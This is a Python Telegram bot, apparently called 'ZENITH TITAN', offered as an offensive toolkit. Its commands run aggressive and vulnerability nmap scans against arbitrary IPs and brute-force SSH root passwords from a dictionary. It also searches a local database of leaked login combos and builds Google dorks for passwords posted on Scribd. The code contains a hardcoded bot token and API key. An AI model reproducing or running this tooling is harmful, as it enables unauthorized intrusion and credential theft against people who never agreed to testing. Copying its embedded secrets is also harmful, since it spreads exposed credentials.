import telebot
from telebot import types
import requests
import subprocess
import os
import re
import socket
import paramiko
import whois
from urllib.parse import quote

# ==========================================
# CONFIGURACIÓN
# ==========================================
TOKEN = "8583960709:AAGMxsIwVzlVUu-YvSn6Rfxn3-2Vfe-T3WU"
NETLAS_API_KEY = "MheJyCwplJnLO8CU1ZOC7A7OkJFTYvnk"
ADMIN_ID = 6280594821 

bot = telebot.TeleBot(TOKEN)
DB_PATH = "database.txt" # Base de datos de combos/leaks locales
DICC_PATH = "diccionario.txt" # Para fuerza bruta SSH

# Asegurar archivos
for p in [DB_PATH, DICC_PATH]:
    if not os.path.exists(p):
        with open(p, "w") as f: f.write("admin:admin\n")

# ==========================================
# MOTORES TÉCNICOS
# ==========================================

def search_local_db(query):
    matches = []
    if os.path.exists(DB_PATH):
        with open(DB_PATH, 'r', errors='ignore') as f:
            for line in f:
                if query.lower() in line.lower():
                    matches.append(line.strip())
                    if len(matches) >= 15: break
    return matches

# ==========================================
# MANEJADORES DE COMANDOS
# ==========================================

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.chat.id != ADMIN_ID: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    markup.add('/logins', '/map', '/scan', '/scan_ports', '/scan_full', '/find_bugs', '/exploit', '/cms', '/status')
    bot.send_message(message.chat.id, "🛰 **ZENITH TITAN v80.0**\nSistemas de Escaneo y DB Local: **LISTOS**", reply_markup=markup)

# --- [logins] Búsqueda Dual (Web + Local) ---
@bot.message_handler(commands=['logins'])
def cmd_logins(message):
    msg = bot.send_message(message.chat.id, "🔎 **Búsqueda de Logins:** Ingrese objetivo:")
    bot.register_next_step_handler(msg, exec_logins_dual)

def exec_logins_dual(message):
    target = message.text.strip()
    bot.send_message(message.chat.id, f"📡 Buscando `{target}` en base local y web...")
    
    # Búsqueda Local
    local_res = search_local_db(target)
    # Búsqueda Web (Scribd Dork)
    scribd = quote(f'site:scribd.com "{target}" password')
    
    res = f"📂 **RESULTADOS LOCALES:**\n"
    res += "\n".join([f"`{r}`" for r in local_res]) if local_res else "❌ No hay coincidencias en DB local."
    res += f"\n\n🌍 **RECURSOS WEB:**\n[Resultados en Scribd](https://www.google.com/search?q={scribd})"
    
    bot.send_message(message.chat.id, res, parse_mode="Markdown", disable_web_page_preview=True)

# --- MÓDULOS DE ESCANEO (SCAN) ---

@bot.message_handler(commands=['scan']) # Netlas Passive
def cmd_scan(message):
    msg = bot.send_message(message.chat.id, "🌐 **Netlas Intelligence:** Ingrese IP o Dominio:")
    bot.register_next_step_handler(msg, exec_netlas)

def exec_netlas(message):
    headers = {"X-API-Key": NETLAS_API_KEY}
    try:
        r = requests.get(f"https://app.netlas.io/api/host/{message.text}/", headers=headers, timeout=10)
        d = r.json()
        data = d.get('data', d) # Manejo de diferentes respuestas de API
        bot.send_message(message.chat.id, f"🛰 **NETLAS INFO:**\nIP: `{data.get('ip')}`\nISP: `{data.get('isp', 'N/A')}`\nPaís: `{data.get('geo', {}).get('country', 'N/A')}`")
    except: bot.send_message(message.chat.id, "❌ Error en API Netlas.")

@bot.message_handler(commands=['scan_ports']) # Fast Scan
def cmd_scan_ports(message):
    msg = bot.send_message(message.chat.id, "⚡ **Quick Scan (20 puertos):** Ingrese IP:")
    bot.register_next_step_handler(msg, exec_quick_scan)

def exec_quick_scan(message):
    ip = message.text.strip()
    try:
        res = subprocess.check_output(["nmap", "--top-ports", "20", ip], text=True)
        bot.send_message(message.chat.id, f"```\n{res}\n```", parse_mode="Markdown")
    except: bot.send_message(message.chat.id, "❌ Error en escaneo rápido.")

@bot.message_handler(commands=['scan_full']) # Aggressive Scan
def cmd_scan_full(message):
    msg = bot.send_message(message.chat.id, "🔥 **Full Aggressive Scan:** Ingrese IP:")
    bot.register_next_step_handler(msg, exec_full_scan)

def exec_full_scan(message):
    ip = message.text.strip()
    bot.send_message(message.chat.id, f"⌛ Escaneo profundo en curso para `{ip}`... (Espere)")
    try:
        res = subprocess.check_output(["nmap", "-A", "-T4", ip], text=True, timeout=300)
        bot.send_message(message.chat.id, f"📂 **REPORTE COMPLETO:**\n```\n{res[:1500]}\n```", parse_mode="Markdown")
    except: bot.send_message(message.chat.id, "❌ El escaneo tardó demasiado o falló.")

# --- [map] Mapeo DNS ---
@bot.message_handler(commands=['map'])
def cmd_map(message):
    msg = bot.send_message(message.chat.id, "🛰 **Mapeo DNS:** Ingrese dominio:")
    bot.register_next_step_handler(msg, exec_map)

def exec_map(message):
    dom = message.text.strip().lower()
    subs = ["www", "vpn", "mail", "dev", "api", "secure", "admin", "cloud"]
    res = [f"🛰 **MAPEO DNS: {dom}**\n"]
    for s in subs:
        try:
            ip = socket.gethostbyname(f"{s}.{dom}")
            res.append(f"• {s}.{dom} ➔ `{ip}`")
        except: res.append(f"• {s}.{dom} ➔ [No IP]")
    bot.send_message(message.chat.id, "\n".join(res), parse_mode="Markdown")

# --- [find_bugs] Auditoría CVE ---
@bot.message_handler(commands=['find_bugs'])
def cmd_bugs(message):
    msg = bot.send_message(message.chat.id, "🛡 **Audit Vuln:** Ingrese IP:")
    bot.register_next_step_handler(msg, exec_bugs)

def exec_bugs(message):
    ip = message.text.strip()
    try:
        res = subprocess.check_output(["nmap", "-sV", "--script=vuln", ip], text=True, timeout=150)
        bot.send_message(message.chat.id, f"📂 **VULN REPORT:**\n```\n{res[:1500]}\n```", parse_mode="Markdown")
    except: bot.send_message(message.chat.id, "❌ Error Nmap Vuln.")

# --- [exploit] SSH Force ---
@bot.message_handler(commands=['exploit'])
def cmd_brute(message):
    msg = bot.send_message(message.chat.id, "💣 **SSH Exploit:** Ingrese IP:")
    bot.register_next_step_handler(msg, exec_brute_ssh)

def exec_brute_ssh(message):
    ip = message.text.strip()
    with open(DICC_PATH, "r") as f: passwords = [l.strip() for l in f.readlines()]
    for p in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username="root", password=p, timeout=1.5)
            ssh.close()
            bot.send_message(message.chat.id, f"✅ **ACCESO:** `{ip}` | `root:{p}`")
            return
        except: continue
    bot.send_message(message.chat.id, "❌ Fuerza bruta fallida.")

# --- Gestión de Archivos ---
@bot.message_handler(content_types=['document'])
def handle_docs(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    # Si el nombre tiene 'dic' es para exploit, sino va a la DB de logins
    path = DICC_PATH if "dic" in message.document.file_name.lower() else DB_PATH
    with open(path, 'ab') as f: f.write(downloaded + b"\n")
    bot.send_message(message.chat.id, f"✅ Cargado en `{path}`. Total líneas: {len(open(path).readlines())}")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    bot.send_message(message.chat.id, "🟢 **ZENITH TITAN:** ONLINE\n📦 **DB Local:** Activa\n📡 **Engine:** v80.0 Total-Control")

if __name__ == "__main__":
    bot.infinity_polling()
